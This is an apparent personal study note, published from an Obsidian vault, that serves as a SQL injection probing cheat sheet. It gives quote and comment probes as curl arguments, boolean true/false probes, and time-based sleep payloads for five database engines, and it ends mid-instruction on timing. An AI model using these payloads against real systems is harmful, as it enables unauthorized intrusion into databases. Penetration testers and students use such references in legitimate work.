---
{"dg-publish":true,"permalink":"/itsi/tools/attackflows/sqli-probing/"}
---

# SQLi Probing
## 1. Comment Probes

| Probe         | Purpose                                                                                | Command (`curl`)                     |
| ------------- | -------------------------------------------------------------------------------------- | ------------------------------------ |
| `'`           | **Single Quote:** The most common probe. Tries to close a string literal prematurely.  | `-d "username=admin'&password=x"`    |
| `"`           | **Double Quote:** Use if single quotes don't work (e.g., MySQL with ANSI_QUOTES mode). | `-d "username=admin\"&password=x"`   |
| `'--` or `'#` | **Comment:** Tries to inject a quote and then comment out the rest of the query.       | `-d "username=admin'-- &password=x"` |
| `';`          | **Semicolon:** Tests if stacked queries are allowed.                                   | `-d "id=1'; SELECT 1"`               |
| `\`           | **Backslash:** Tries to escape a character and break the query syntax.                 | `-d "username=admin\&password=x"`    |

**Goal:** Any database error message, a generic server error (HTTP 500), or a weirdly rendered page.

---

## 2. Boolean-Based Probes

|Condition|Probe|Expected Result if Vulnerable|
|---|---|---|
|**TRUE**|`1' OR '1'='1` `1 OR 1=1`|The page looks **normal**, as if you just requested `id=1`. The logic is `(id=1) OR (TRUE)`.|
|**FALSE**|`1' AND '1'='2` `1 AND 1=2`|The page shows **"not found," "invalid item,"** or different content. The logic is `(id=1) AND (FALSE)`.|

**Goal:** A consistent difference between the TRUE and FALSE responses.

---

## 3. Time-Based Probes

|Database|Payload Example (causes a 5-second delay)|
|---|---|
|**MySQL**|`1' AND (SELECT SLEEP(5))--`|
|**PostgreSQL**|`1' AND pg_sleep(5)--`|
|**SQL Server**|`1'; WAITFOR DELAY '0:0:5'--`|
|**Oracle**|`1' AND DBMS_LOCK.SLEEP(5)--`|
|**SQLite**|`1' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000))))--` (This is a heavy query, not a direct sleep function)|
**Goal:** A significant delay in the server's response time that matches the sleep command you sent. Use `curl`'s `-w` flag to measure it: